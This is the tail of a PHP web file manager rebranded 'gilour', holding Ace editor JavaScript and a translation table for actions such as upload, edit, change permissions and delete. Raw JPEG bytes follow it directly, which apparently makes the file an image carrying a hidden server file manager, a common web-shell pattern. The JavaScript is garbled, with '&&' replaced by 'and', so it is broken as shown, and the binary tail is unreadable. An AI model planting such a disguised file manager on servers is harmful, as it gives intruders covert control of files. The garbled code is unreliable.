Document","csound_orchestra":"Csound","csound_score":"Csound Score","css":"CSS","curly":"Curly","d":"D","dart":"Dart","diff":"Diff","dockerfile":"Dockerfile","dot":"Dot","drools":"Drools","edifact":"Edifact","eiffel":"Eiffel","ejs":"EJS","elixir":"Elixir","elm":"Elm","erlang":"Erlang","forth":"Forth","fortran":"Fortran","fsharp":"FSharp","fsl":"FSL","ftl":"FreeMarker","gcode":"Gcode","gherkin":"Gherkin","gitignore":"Gitignore","glsl":"Glsl","gobstones":"Gobstones","golang":"Go","graphqlschema":"GraphQLSchema","groovy":"Groovy","haml":"HAML","handlebars":"Handlebars","haskell":"Haskell","haskell_cabal":"Haskell Cabal","haxe":"haXe","hjson":"Hjson","html":"HTML","html_elixir":"HTML (Elixir)","html_ruby":"HTML (Ruby)","ini":"INI","io":"Io","jack":"Jack","jade":"Jade","java":"Java","json":"JSON","jsoniq":"JSONiq","jsp":"JSP","jssm":"JSSM","jsx":"JSX","julia":"Julia","kotlin":"Kotlin","latex":"LaTeX","less":"LESS","liquid":"Liquid","lisp":"Lisp","livescript":"LiveScript","logiql":"LogiQL","lsl":"LSL","lua":"Lua","luapage":"LuaPage","lucene":"Lucene","makefile":"Makefile","markdown":"Markdown","mask":"Mask","matlab":"MATLAB","maze":"Maze","mel":"MEL","mixal":"MIXAL","mushcode":"MUSHCode","mysql":"MySQL","nix":"Nix","nsis":"NSIS","objectivec":"Objective-C","ocaml":"OCaml","pascal":"Pascal","perl":"Perl","perl6":"Perl 6","pgsql":"pgSQL","php_laravel_blade":"PHP (Blade Template)","php":"PHP","puppet":"Puppet","pig":"Pig","powershell":"Powershell","praat":"Praat","prolog":"Prolog","properties":"Properties","protobuf":"Protobuf","python":"Python","r":"R","razor":"Razor","rdoc":"RDoc","red":"Red","rhtml":"RHTML","rst":"RST","ruby":"Ruby","rust":"Rust","sass":"SASS","scad":"SCAD","scala":"Scala","scheme":"Scheme","scss":"SCSS","sh":"SH","sjs":"SJS","slim":"Slim","smarty":"Smarty","snippets":"snippets","soy_template":"Soy Template","space":"Space","sql":"SQL","sqlserver":"SQLServer","stylus":"Stylus","svg":"SVG","swift":"Swift","tcl":"Tcl","terraform":"Terraform","tex":"Tex","text":"Text","textile":"Textile","toml":"Toml","tsx":"TSX","twig":"Twig","typescript":"Typescript","vala":"Vala","vbscript":"VBScript","velocity":"Velocity","verilog":"Verilog","vhdl":"VHDL","visualforce":"Visualforce","wollok":"Wollok","xml":"XML","xquery":"XQuery","yaml":"YAML","django":"Django"},"fontSize":{8:8,10:10,11:11,12:12,13:13,14:14,15:15,16:16,17:17,18:18,20:20,22:22,24:24,26:26,30:30}};
            if(_data and _data.aceMode) { $modeEl.html(optionNode("ace/mode/", _data.aceMode)); }
            if(_data and _data.aceTheme) { var lightTheme = optionNode("ace/theme/", _data.aceTheme.bright), darkTheme = optionNode("ace/theme/", _data.aceTheme.dark); $themeEl.html("<optgroup label=\"Bright\">"+lightTheme+"</optgroup><optgroup label=\"Dark\">"+darkTheme+"</optgroup>");}
            if(_data and _data.fontSize) { $fontSizeEl.html(optionNode("", _data.fontSize)); }
            $modeEl.val( editor.getSession().$modeId );
            $themeEl.val( editor.getTheme() );
            $fontSizeEl.val(12).change();
        }

        $(function(){
            renderThemeMode();
            $(".js-ace-toolbar").on("click", 'button', function(e){
                e.preventDefault();
                let cmdValue = $(this).attr("data-cmd"), editorOption = $(this).attr("data-option");
                if(cmdValue and cmdValue != "none") {
                    ace_commend(cmdValue);
                } else if(editorOption) {
                    if(editorOption == "fullscreen") {
                        (void 0!==document.fullScreenElementandnull===document.fullScreenElement||void 0!==document.msFullscreenElementandnull===document.msFullscreenElement||void 0!==document.mozFullScreenand!document.mozFullScreen||void 0!==document.webkitIsFullScreenand!document.webkitIsFullScreen)
                        and(editor.container.requestFullScreen?editor.container.requestFullScreen():editor.container.mozRequestFullScreen?editor.container.mozRequestFullScreen():editor.container.webkitRequestFullScreen?editor.container.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT):editor.container.msRequestFullscreenandeditor.container.msRequestFullscreen());
                    } else if(editorOption == "wrap") {
                        let wrapStatus = (editor.getSession().getUseWrapMode()) ? false : true;
                        editor.getSession().setUseWrapMode(wrapStatus);
                    }
                }
            });
            $("select#js-ace-mode, select#js-ace-theme, select#js-ace-fontSize").on("change", function(e){
                e.preventDefault();
                let selectedValue = $(this).val(), selectionType = $(this).attr("data-type");
                if(selectedValue and selectionType == "mode") {
                    editor.getSession().setMode(selectedValue);
                } else if(selectedValue and selectionType == "theme") {
                    editor.setTheme(selectedValue);
                }else if(selectedValue and selectionType == "fontSize") {
                    editor.setFontSize(parseInt(selectedValue));
                }
            });
        });
    </script>
<?php endif; ?>
<div id="snackbar"></div>
</body>
</html>
<?php
}

function lng($txt) {
    global $lang;

    $tr['en']['AppName']        = 'gilour';      $tr['en']['AppTitle']           = 'gilour';
    $tr['en']['Login']          = 'Sign in';                $tr['en']['Username']           = 'Username';
    $tr['en']['Password']       = 'Password';               $tr['en']['Logout']             = 'Sign Out';
    $tr['en']['Move']           = 'Move';                   $tr['en']['Copy']               = 'Copy';
    $tr['en']['Save']           = 'Save';                   $tr['en']['SelectAll']          = 'Select all';
    $tr['en']['UnSelectAll']    = 'Unselect all';           $tr['en']['File']               = 'File';
    $tr['en']['Back']           = 'Back';                   $tr['en']['Size']               = 'Size';
    $tr['en']['Perms']          = 'Perms';                  $tr['en']['Modified']           = 'Modified';
    $tr['en']['Owner']          = 'Owner';                  $tr['en']['Search']             = 'Search';
    $tr['en']['NewItem']        = 'New Item';               $tr['en']['Folder']             = 'Folder';
    $tr['en']['Delete']         = 'Delete';                 $tr['en']['Rename']             = 'Rename';
    $tr['en']['CopyTo']         = 'Copy to';                $tr['en']['DirectLink']         = 'Direct link';
    $tr['en']['UploadingFiles'] = 'Upload Files';           $tr['en']['ChangePermissions']  = 'Change Permissions';
    $tr['en']['Copying']        = 'Copying';                $tr['en']['CreateNewItem']      = 'Create New Item';
    $tr['en']['Name']           = 'Name';                   $tr['en']['AdvancedEditor']     = 'Advanced Editor';
    $tr['en']['Actions']        = 'Actions';                $tr['en']['Folder is empty']    = 'Folder is empty';
    $tr['en']['Upload']         = 'Upload';                 $tr['en']['Cancel']             = 'Cancel';
    $tr['en']['InvertSelection']= 'Invert Selection';       $tr['en']['DestinationFolder']  = 'Destination Folder';
    $tr['en']['ItemType']       = 'Item Type';              $tr['en']['ItemName']           = 'Item Name';
    $tr['en']['CreateNow']      = 'Create Now';             $tr['en']['Download']           = 'Download';
    $tr['en']['Open']           = 'Open';                   $tr['en']['UnZip']              = 'UnZip';
    $tr['en']['UnZipToFolder']  = 'UnZip to folder';        $tr['en']['Edit']               = 'Edit';
    $tr['en']['NormalEditor']   = 'Normal Editor';          $tr['en']['BackUp']             = 'Back Up';
    $tr['en']['SourceFolder']   = 'Source Folder';          $tr['en']['Files']              = 'Files';
    $tr['en']['Move']           = 'Move';                   $tr['en']['Change']             = 'Change';
    $tr['en']['Settings']       = 'Settings';               $tr['en']['Language']           = 'Language';        
    $tr['en']['ErrorReporting'] = 'Error Reporting';        $tr['en']['ShowHiddenFiles']    = 'Show Hidden Files';
    $tr['en']['Help']           = 'Help';                   $tr['en']['Created']            = 'Created';
    $tr['en']['Help Documents'] = 'Help Documents';         $tr['en']['Report Issue']       = 'Report Issue';
    $tr['en']['Generate']       = 'Generate';               $tr['en']['FullSize']           = 'Full Size';              
    $tr['en']['HideColumns']    = 'Hide Perms/Owner columns';$tr['en']['You are logged in'] = 'You are logged in';
    $tr['en']['Nothing selected']   = 'Nothing selected';   $tr['en']['Paths must be not equal']    = 'Paths must be not equal';
    $tr['en']['Renamed from']       = 'Renamed from';       $tr['en']['Archive not unpacked']       = 'Archive not unpacked';
    $tr['en']['Deleted']            = 'Deleted';            $tr['en']['Archive not created']        = 'Archive not created';
    $tr['en']['Copied from']        = 'Copied from';        $tr['en']['Permissions changed']        = 'Permissions changed';
    $tr['en']['to']                 = 'to';                 $tr['en']['Saved Successfully']         = 'Saved Successfully';
    $tr['en']['not found!']         = 'not found!';         $tr['en']['File Saved Successfully']    = 'File Saved Successfully';
    $tr['en']['Archive']            = 'Archive';            $tr['en']['Permissions not changed']    = 'Permissions not changed';
    $tr['en']['Select folder']      = 'Select folder';      $tr['en']['Source path not defined']    = 'Source path not defined';
    $tr['en']['already exists']     = 'already exists';     $tr['en']['Error while moving from']    = 'Error while moving from';
    $tr['en']['Create archive?']    = 'Create archive?';    $tr['en']['Invalid file or folder name']    = 'Invalid file or folder name';
    $tr['en']['Archive unpacked']   = 'Archive unpacked';   $tr['en']['File extension is not allowed']  = 'File extension is not allowed';
    $tr['en']['Root path']          = 'Root path';          $tr['en']['Error while renaming from']  = 'Error while renaming from';
    $tr['en']['File not found']     = 'File not found';     $tr['en']['Error while deleting items'] = 'Error while deleting items';
    $tr['en']['Moved from']         = 'Moved from';         $tr['en']['Generate new password hash'] = 'Generate new password hash';
    $tr['en']['Login failed. Invalid username or password'] = 'Login failed. Invalid username or password';
    $tr['en']['password_hash not supported, Upgrade PHP version'] = 'password_hash not supported, Upgrade PHP version';
    $tr['en']['Advanced Search']    = 'Advanced Search';    $tr['en']['Error while copying from']    = 'Error while copying from';
    $tr['en']['Invalid characters in file name']                = 'Invalid characters in file name';
    $tr['en']['FILE EXTENSION HAS NOT SUPPORTED']               = 'FILE EXTENSION HAS NOT SUPPORTED';
    $tr['en']['Selected files and folder deleted']              = 'Selected files and folder deleted';
    $tr['en']['Error while fetching archive info']              = 'Error while fetching archive info';
    $tr['en']['Delete selected files and folders?']             = 'Delete selected files and folders?';
    $tr['en']['Search file in folder and subfolders...']        = 'Search file in folder and subfolders...';
    $tr['en']['Access denied. IP restriction applicable']       = 'Access denied. IP restriction applicable';
    $tr['en']['Invalid characters in file or folder name']      = 'Invalid characters in file or folder name';
    $tr['en']['Operations with archives are not available']     = 'Operations with archives are not available';
    $tr['en']['File or folder with this path already exists']   = 'File or folder with this path already exists';

    $i18n = fm_get_translations($tr);
    $tr = $i18n ? $i18n : $tr;

    if (!strlen($lang)) $lang = 'en';
    if (isset($tr[$lang][$txt])) return fanco($tr[$lang][$txt]);
    else if (isset($tr['en'][$txt])) return fanco($tr['en'][$txt]);
    else return "$txt";
}

?>



  1$$1,5+(+5,N=77=NZLHLZnbbn�������� C				
	

  1$$1,5+(+5,N=77=NZLHLZnbbn�������� ��" ��           	
�� �   } !1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������        	
�� �  w !1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? ��1P�S:��U 9̎�=I���S�
I��W_lI�a����gcH���#��ML#;e �.�5T�z���J� �~�;���'W^��# Տ�O��l� ��I!pG!�~�nA�f�D��Bp)S9͝�85f��	 ����\KJ�2����AA�*X_ʐdA�OqV��h�����W/���n*PI�0��8�@EAd�� ���� ���W"M�*���3�ƙ1��� 9 �)�7+����I'��1���&�=�U
Cd��M��N��	5:A���Ќ��Pg-		$d�����%^��$f���0vh�I�0PF��Ƨ����Ȇ�:2��A��`84��FMtFJ�mjIE1\58��B�MV%���0k���4�3Ma�PH$�\u$�	��)��8 �@Y�����H��i��
>��e�� �R�VP�|�����A� F��Ab�@���(��z��JH´��( T�~
)��á��r-ːpG"����%�=D\IRX- ]�R�A�wx�!T��J�(`V�8,){�hEXʐH'�cS!�s�:�zȝ�|��5��3n��ܦFPy��cZN�ɓ~U�A��s�T�\�:}� ��(gH�	h�!Cr�SR:ne�Y�<d��*F�]��m�Ѫ��� !,	�*�"T���իd�e��k�KUb�yH�i�6��~�Kz�ښ�Ή�#f� ���X�RN�F!O���ۙ�M�TDQ*+�����E���K{'��`bb ��]m� u$���W���IBJG�^�F�a� ���r���j�2� ���U����&��O�mVj{
qܻu$U%�ڨ�XfW �<�M.D��Uy'��A)�P2FЀ�Q�b����K�&�T�U4�D��2�c�}*�roR}	�j��.�*��)��SC���►Q�
CKILD.X�U6回���Q�N
[���f�ң9'4�ig�v���]1�lQ3�w��}�pMAT�:�w�x�d1 ��R�99�i�1�銜$ҌJ@�uRP��)�}��}�84��i1l�T�� ���!A�M9B�s=�g=��� �'�W�*s����NB
��� �ɮx,*r.J��"6N:KN[icm�0'ЎD�r1��
�.��kX:���j�Q���B;��Fn��5p6@�f���@ǡ�*���@�q��i�䇀@e-�Ɠc�p)DY��_=R�Y�zGZ�5���d �*����PI�P�Xɔ7:�Rd�Nwʀ �j ��q4������@�f��s@����)c����\�f��U��r*��%bI!�Pz�iT��J)���h�	!@Ȩ�' ��`j�a &�bӹ&�e�������i6�E,G8�4D�H$���	,J���Up�# ����F
_g7cX�f',=�L�X/)�
<����s�N�#���C@5��^�Dc�$ԏ�J�`��je�@e$�Q�b;D�jV�hޥ� �A�>���Pa$J[|y8"���|���X�z�J�T�^�rG���4\KȰ�.s�4�j5$�y"���bQ�]�owaY����H=�5��M��U��_-  Uw�`$�d��t���r��)��8
  
� ��qF�
��qJ�F#�+I!!:P��*R�fF:Է`�:� ���In� SHnN�mG �T'�O�*�)J*�X����\��  �D�;O�ND
2�$��)��o
InKw"��8
��<�]@,ŉ< p	��q��������t>��J��4��nVlP�Y���5X�`?�q��k����	�������UM��1�j� ��$�{��vTRA�S�HEW���9C��A���U<WQc�����RG��6�dg���89�pUbecʟ�ҰĔƬ��$C�b<Ǣ�A��T�db� ��Ո��2H=��z�]�[AeqRIa�=��7�	��=ǽ@HH
Y����O�H����R0=A�-\�F�QИ��`� �j���0 ~�0��!`K`�j��+C)\�E�`�Yػ�͸�3�<C��$t>Վ��,%��$�k�� RFKo���<��'1�n��ª�������+A���X��0����i�1�	��4$mԡ��*Oq����\�����zo�wz[B�A�[Y$���I��Gֳof͸)U���O��$(f���s�#0�g;����������oqR:'��� t �5��Xa$��[K`dW�� `½�=9TW_	�Vq��[���U����qW���g?(l�|;1��*H-��7�v���D��*;]��+ �r���=$9�,���1��y��s�G_�F�;6��L���SRѳ9�F��]���z��hTu\�z�b�(�qOp4��*�!��KLpH�h˜39 d�k.X��ecm�H54	�r��W��2��O� @ň�'5#����)��m䯐��k���*rf�����tJ�U�2���2M\�@�$eG�k�R����w5
Q�!���䚲��\�U�EQ� �^�,$ ��G$�ɽ���fcۀG�w���i3����Y�Is'BEJt�.cHNrV,�"G�M8!'q�8��UQsR"�iVXX�8�&�Ui8i#7	�jg����f�(q�נ�VɊ0&$�(��c_?��NO��+�i�)�F�f�f��#�E0�CE���A�"�iƚh��iM4�xpy��P��
p���Pi1�UӐ�	4��H u⤒&B�f�,+du�' ��C`qR�b�Vm&I%�k���8P#$c�ٮMYO#��tXʩ� $�uˎ��͜��g���ڦ�;m2��G�X��}Ĝ���W�bdG� ����Ɲ	�ܯ��j�Q��H�*x �5R��&���$H��BX6c�pG�TX��E��5� t���x�������ԕ�#9&�-'`v��{Q̙&���bAb(D��@$����r��S�
͈�G(�Cn�B�X�0A��V �A�b��J��Q��79%�EQȡ�3b��&�D�A���8�<ݿv��L�I�4	�-�a(Tl���U���2��F	�5�f�eO��� �N�\ޢb��K����BHNX���k����6�)�@9 �1  �y&��P�Y�\sL Ra6R�i� �V�	 ӁZ�͍�I�'8� �7��#��?ƫ���#��}*���Z��nh�¢{��Fv8P2M`}��u�s߫�
d���`?�� ��\���d@��q�a���)�<6I$����-���j��$�E'	$
�T�6�z>�A9�:�O$�v�zf�y!F����C���Rs��E��<�� X��<�R@5��@vڰ��*�������n��؞?E&�P�Y3�R�MI���P;�*x����ĸ= &�}�#�H~�i�~���R��y�{џ�D}�L�=��"a�"�}����R������6�(r��'�0 �w�a�K�	���Y�WS� ԿPi:{M�����~�@&�X�-&�`͒9sںg����Щ?��ͧ@s����#����-V2��|��XZp̊�@8|�ʫ��Eu���Sx���,�!��GQ\���:�UU2kt��aU廷/'��� a�O����]	��^���$��ŉbsXƄ��i�4�iDJ�	7F�`���R�g�2��$��z͜��7�$�2sS�v�m�+_g�m�U�9�#}YB����k0�*iD$4D�csןCP3����nִ��bX@@����j��Hα��PK�z
� 2����l^d-7��I ��eUZt�be:�.fBŋ*�Zyq�Qރr ���q�z��m���Z�PHe&��V[��)�lI4�M�A�X�Wi''T8�= n�WM�Ub���cdh��"�	���GmO!�Ph�4�CHiM4� 5VK����MH�y �-�d�S&�ɤ"����BzLh&���-L��XrAS�*����sQ�b�
I`�ʁF  R�)��kX�V�L�)I�IU.g
v� ��hX�Y�̳d0^z��εNUe�HҔ.���<��-L1L���'#�_C88`}@��w+���Xu8k#EU��LU?5[yb!B�9���$Q�ٌj���;F��kͭ	a�����%SQ�y݈ rOaD���I#�SB�r0�T.wH���Q~���Ӽ�W�i�:�b���f�i>�i`%NE��	�&�i���4�M8�M ;�Ē4�*��B9O�[�Q�>��N��ҍ���8P0Mr)�=W'�[J#�C�[r	c#k�+�C�\�dS�9����$��𪠕 �Ij7�8;X�ԛ�}��$� ���8($q�y��Qd��!�S��O,@Q����Wv@�.� ��ܴ���=�i[�1�DVrD��c ��XۂI*r}�)Gbu���*y���,m�� uZ�uFh�e�����b�!�v�v9���3��W3.Y����~�s��: h�D�VT )���mE`z��*d��)4m �ET��m�T�}��9'�j�j����q�FW��5L�jiP���.j�$�eD�p�=�*5F*H�����݋n�4��FjR�?��Ȫՙ4�hɘ�XrG�YDc&��-�X�q��$yj�rx��Z8M��Ɯ����Oz�b}�0Ѓ�S~.#V /.I=qҗ�q�i�bFa�B:��7Ԛ秜��O�nL�]`��k,�`�=@��q�$�lK�������_��1X����{UY�1�\�{��6Ъ�  AZX���XbEDUU ��a�"� Ėn�I�
��Ԭ1$n�}M^I��3�����O�����7%����X��ߟAY�Ol~�4��1"��2�#5Ԯ��F���C�F�� P5RSX.����E��d���i�T�k�@�J$ ��P��� CT���[^�dV�_�B��kʀ��ԟp)D��b+$_U��$�&�dRx`��=��<���H�p�F�ٹ��*���y[�nFA
�iE��v�MI������ߨ��=%�O���íSj���PR2\�<.G�0j��`����)���/�۽�0J~�G���M�g*���vG��=o�ky���T8�4������
��]r3��G�Tyg��`[�z�V�Cq 1�ï�\���c�G��VR�m
�n$2����� ��I���GCV$��'�؏cT'C����q6R�w��H� ���rѢH$���K>#)ؐj�rNp+Zq3��<�
b@�X�������d��I�K`WUՌu$�p¦�ԫnb	C09 �Ei�ȯw����n>�ŉ�4�V��iƚMz�RPi�� Z��R*���!�z��lz��r}"kG���)�
SU"��!X�(�g5qw&J�4�A`�MW{�V �j���I��	��Ґ)�!���
�,�b ���\�����7�N�RT�$ʹ�sL�0��rj�8 �����B��q�,Ƹ�םCyEDЁ��ˑ� �/w|��*�񲌳�*�I�_*^ꎤB�e�2��f��GE������z�'�#�E%dX�RO\1�IIYʤ��Hs1bI9&�A��@%��!�N4��4���i �HiM4��H��!�5�	�"|P�Ŷ@��s���먮�����#ޚ��i�4�5l�r{S3�B*PAR � ԔYIȩ�A1e%Fzz��)U� �R�إ>��e#��R	m�M�ebr@ �����N)[�\ˡd>�f�S�i;���c�*�R�P����jX.UP�\h����;�p���*U1P� {��E�.��,	5�i�|�A�ck�:�t���51�D���@H�4����@
k�H���ɗ5�5�-�;�*յ���*1Y���<�u�Q�0n��KA�7V4�,h�}G�T�M�  ��X��J`�`z{UG@2 #�O��`�s�# �G��F(�p��z�-%�e��2=�j���m�!�vQ�����{b';��$�	�:⬘���{t�u���m��v���7;A��;�iJ&n5抈��QV��ֲ��;A�X�8����hQ���eПf�S�I�r������������@X?
�2�O΃�(K�R�.��d�\Β%J���{v���(�	�׮Le
�8�Yv��=���;�b:/�>��S��}�Nқ&P`<��7��j�E��(���
���m� ��1���ޥH ;���7o��R�   �T]��_-��?��c�e�L *��r�r��d`��&����{*���@>R���:\��?E��0� ���Q@	��P�q�h�U���(��~*s@0`��p++���m�ц*� Re"��"��/r���R-�R��0#P���7.@1,���G���aܝ%{v&��&#��5�m�,��NGPx ��&���r�$<��d�b�J:0>����j��1�W'}�_��YIr	�Q�3��ǆi$d�w��{MA� �\�=A��u�������Y  ��pkU$�\Z(^ibh�D�I�i�g�Wi4o�Xʸ��פQ\[�sIP0�G�Ҕ�G�ʄ*�H��S��I�=���c����w��+ۑ����G;�⎄�MZŀ��N:�Z�DPFEbr9�qDgm�^�Z�rگ��x�&��u��)Ɣ(P �5�#��i3A��cj7r�H�M�4Xi����1�i��$cc�GcW�t��qIB�幦��Nd �$RN&�M�,��b�Y�@ffl`���y�F
:�ԧ
���J��uFrZe.�tZ$�C 	��ϽXw�K*1:�
�B؆��*P�r<��NN�+O�G��)�X�<w4�)+���MD��85�W��RL�iXl�v����k��X��IK� JJRi��	E��@i�Hc��y�"�#4��i��=$20 V���*z�A��V��@XpEi���+��|��5MN}ԃN�`��5fv�sߜZ�% t��9$�Y+�:al�ED\�Lӱ-�5e'G���T����1ĕ-�S�ʱ�z�c*�`A�Q�*�r\�F��NO��h�c��4H�' ��@҆ܮA<|�b��=9��;�28�4,9$��Ԡ+(r1Nt2*�G3R�PI ��&��a�0@��L8���"��Q]U�m����nړ%uc%��W'.{����\T\�IW �GB-+���VA횪��!�*�$p��S�r���d=zc�i[Pe�[��M��<z�j��A �d�?,i��G��,��A�	Z�����&���L%J�s=��I&� ��5A#� ��g� �N1��I�㫞Mii�VO��2� ���ns��zl�(v��+���ey�XW��V��nT1	�ëu�+UI7��ZUR!�|}�ȹ�n\c#�՚�-����!5j��.{lO#JTB:�
~hVP~f�5��Ͷ�ww!���t�H\����w�2�*�@�0��X2�`2��޴���ʃ�;'���� ��Ua� N�1>��\�wN��ڣ��}h)��^d%S�)�~�����a(�9�G���;�<L���Zi�@5ʵVb*�A�UXH����.J�;r @@#*?+o�b��E[h$ TL��(��B%t�����T����IQ����ޝ��P�#�)��Wk,�n��i�� �@���4�
��c���~� *LM�GUc�-K�	V���*��䤃��� �8*�0����CF��6
�A�SGY�ϲl���GAZ"@ʬ�*FA,�2ЖHt%�����WEg8�Ԃ���@�A�V�.ͬ��Llr��E(�V\��P���E0uVR# ��T�@{�Bh�i�tWR�R0Ep�ƒm�e�zC�k�I,i,l�V ���cŦ���@Mu���b�U�Oq���|���-oF�J���F?�J�� V� �P��MLk�0�U*Q_h�kT����i)��A���q����M%�� �f��f�!���`!���i�S�
pQ��ً�d�_�V��D� �+*ʓ���CJn�7�cM��K,�Gf  MBk��$�%����QHh�R�ir) RSM4JBh4R%-%M4��h	��q��z<w���h�r���w��T�G_B(��>਻��EL��Ҏ�zm �\ϗs�sZ�K�� $V����P�z��K�ܗ81�5^�#�ɲ��M9T3 	�w<l���z��#BH���\�v���A�cKB�bpj���$.F?iTTL��r��l���7V9&�`�pG չ��X�������Z=�`g�$�ՙ!���I�<��rPW*��php=K�ά��m �0���H�s�j'�UI�ԂN�O*Z]���`k��b4�O�ry�Ѥ�қ�⬫-"8�U3F#$gq85�,m �U-�c�7���
�^��K��e��q�Z"=Q��j�,��@�U�JW7q:4�Bd'����E"[�@ m��ϩ��iu��fM��܊�nciI��An��+G_�CSo���3�ސ����N~���������� ���ڣ�J-�xd��s����3�'��i'?y�Ԓ���3��3'i9f�Ƣ (���1�(�5֕�V�<���	Ɠk?��W�u5 F  P!���=��Ĉ2 �U, �8��wyU=Gr=}�&4M=�,�:�© �1n��	<���V.T 1��&��XN9F~������� I��	�( '�	m+.D�N��)�������rQ����_Ě�"9�n&������^)�n{:� Q@���4?�P/Gx[����c� ]��������ʹGVԀ�=��ԏU�i	S�#)=�� 
�H&�r��#Rs�S���.��*9�+@����H��-O ���p0�P3;4Ph�@@a���E�ON��E{⁔e�#=W�����0	�CS�C� �T�4�Jc\�a������T���[��c���0t%\w������P�P>�� ��-"BU�+���CLI���OOCV���d8<ƪKu*~�����;Kִa?�c����k~��k�������ϸ�Eh�N��N~t�W֓m*��#�
�+.��(5��b���9f�ʗ�t���s2i�mb���è��f����W��>��iW�I�g(�j��׶<�UW��j�C��a,!f^�����L�cp}W�K1O����8R�v�����#�-�#���  ��z4�4紌9���M5e�"��t'M�2�M)4�jЀ�L�L� ���E%1�bF�R>P2jL
�z�)1���xI!ꌉ($�jMt����A���*x���r�{�]=�J�0isJH� ��eHqL"�	I�SHh ������I�3@!���bSiƚh4Ӎ4�#�'�i�,��Ё�(���d���Ʀ�d���V6Mܽ�/9�� I$���y�
��@Ͻ@�T�W
~Rja��k>T�9�4�h�9r��:��ܑ���B� �����K���%�ͻ(Xd�5�W��1���[p ���0Hq��Iurg��]��j�bZ���r��B0ʌ�Gҩ�I��*Q���E4�RU����>���ۺ#�1�ȩ�13�mP1M	��O�O�2��5�dXX���%�
��B;x�@}�F��(; *@���r��h侥sXf
�䃊�-�8���<J�޵�8��g�V�5����ܚ���g���Wc6�!�	>�4G�9R�TC���K����J%�E�b7���Ri��z��<b�%�G��~k6�c#S �}�*#&i*�Gsp��)��4�@  �$   `
�܂FX����#�Rrwb�����)0w1�~��&y�����sQ �	=�!%���~JP6�' �ނ���� �d�
G8 c�~HB���T�y"�.	c����3��ð�VS���?�Q����O�e��$9#�R ���Vr� =G�U�����9�f�H��n�`5�b=K�oQ�"�T1��j�H:�zϔ#>�6�fS�L���z�PA��n]H|�����VE*A���Bo��Dx'%C��4���*�S��+�GU=EZ����Mx�T�ӱH�ЃL�T�v��E ��g:�")	�O�������i����>v=��;i� 3�/qR����S$,�^���Z�ˌn2.v�
�r;�+E*���d �ʰ�����F0�:�P٪��LW< [��W1d՘".Ś�����6�)!-�Ny�ڮG�!Y��3�>|S�� ���%ɿ��{�k���+�C����Z��쳇�8@OF�z�H�!+�#�|?�<0�hi�Ě�;�X�h��2��/�o�}A��ڪ�U������S�5�y�2��B=Zb!}Z�K��i��vks'�Q\��I�$)� ��5�#�޽L>e�sԭ(;�z���K�{���m��$ =AS3TׯB�i-Y�s�a��q��DM4�SHi�f�J	��RDNGn8���ܪ�'5%�NR*)���� �ɦ0�u+��E�����u%s�BH)i�F!4�ґIH&��h�f�)( �4���4RQ� )���h!��w�7�rJ�  Uu�P2P�4�/8|���
盲: �ɮH��b����΁����=H8"��Jg���Hڳ��^�S~����"�8ʲ���E]�b���,#؊�2�2x�O�Y�7�mc��D�+]d�fUI��"����k�C��iB������>��(@�;�܃�5
�ݜM.�[���� �� ��b ��QFWw'
+X�f��S$�P� �#9#8��Jŉ��8 �ǵw,+���}�*fe@z�sWd��E
2GSU��V��F�A�O[�d����4��I	��YP�dbz浮H�k ��kF��;W�Q{�:�����Q�MH ���[ A��0��j @#6��S%r��nf]�����R�	ݗ$���� i�G�TL�Ԟ«�;A%��$gQ�ɝ��ݏAH��yc��!����TƵ34×8tu4I�:��� ( R@�E5�O���1��=0*�7L
U���\� :����5M�\3�}�h� (=)�)	��
@!@T��CR��h�s�7�w��f
����jtq���p[kC�4�,�0���I�H:�QMrB�)�T������S��rh � @5;NG�'�4�@�:�:�z��"D<a����F���2�0�G��hՅ�8&��YPL����գp�u��E����$!�+rHn�1Sq'4��bb���u�
��E6uV���ޝ-�h�(˧ z�⧀Gu�'r��ЏF���$�( 
��
�m3�fǘ� �u����;�l
�l�H%,���;�S�ee��#��s��.a�A��zCZ6��G�O��>��C�H�� 
s��#���7�X`��)2[�I_�G&��R��F�*ԡj�1���	�������O��m�arK��'��j�T$8e9�Se��ܝG��)�[�.TvҖʷ�^��֞`9d�(1L$���taZGFbɞY ��K!��p;ⴢt�C)�U���	^X�kod��:r�NT�>��owbz\��l<�̨2�2@�+���"�"��+��!���}k�����|��!��?
���'��z��G0���&�5�1��i��i�� �CKI�c".�ņI 
��<QC�oN)2����!�Ib:TK�bO��6�f$�)��[�M�2���#O5�uҕ5�S�Q��I I_,�u=�#^%e5?z<�Dl89 �&��k�8��ƛHBJSI@	IJi $�
 J3N(h
 $�@ ����PSM-�i�4���#���A�؉��LI�B�w�T5�+�E�77�뚢��M7mJ�>OǊHܪ��i�`��	�)�r7�2j�L�A-��|}ɨ��
�!`0ئċ0�2T�׹&˜��A�5��l�O����	<pk٪�HY�<R�B��NIj�@��hNٕ���o7���܎�Q��;��a�!/�s�XG֩�7+�pq�@�;��u8"�Ug�K�n�*��%M)�!�^�{�\ #i��ֲn�!������G�@���Gִ' �SХa?�&�~�I�)̄`�@H"�ȗ$.@䊈��$ҒKdi�2�dH� �k8�2ze�mƫ��o�G�iҹ'�1� ( V���	�c�j3��=3ɧ�@��Б�X�ִc
f(9�;y��2���������ʊ�� �Y�r�~�cj�{���C"1������l~MXy����!%���@��4qg���)Q71��~"��l�/��BN 2+��C�p~��rB2+0�HOf�j�m����U�ረ*��a�
�h ��J�����SG�(\�))A��
����*PC A�ИG����F��&I�H5hy{pj	 2�GP;�E"��Ub�����u��%�0 1O�B#Y�e�!���E�t�D�հ0w=��V�%�YBʇ�����V�xz�����L��F!	3B2���/�qI���2:d�<r��@�y ��c�hA*K���p}�&%&3�=W�!�-��8e=T��W�ep8<7�5�䰚�~=X���3�G𺞠����l
~*(	)��d8>���"�#�"#&�.�iGZRhHW"�v3 �����K0�+��'�ޓnpj��pFkKdV�ix����>�y��A�& `��A���V�eDz�1?�j]6��c �=�#�"�����j��7ܐ2�>�����,�j�l�1�gpG���{�݆�}���Β��dS��c]�ӓ���D�	��L�@i���-üI�X�ou'��Q�+�0�S�Y�R<�4�c��,2*�����8�'Z���^�-e�N��1ʞ�ƴ���U�H� �M�V`H�t.A�)��sQ<���FSW)$���� F9
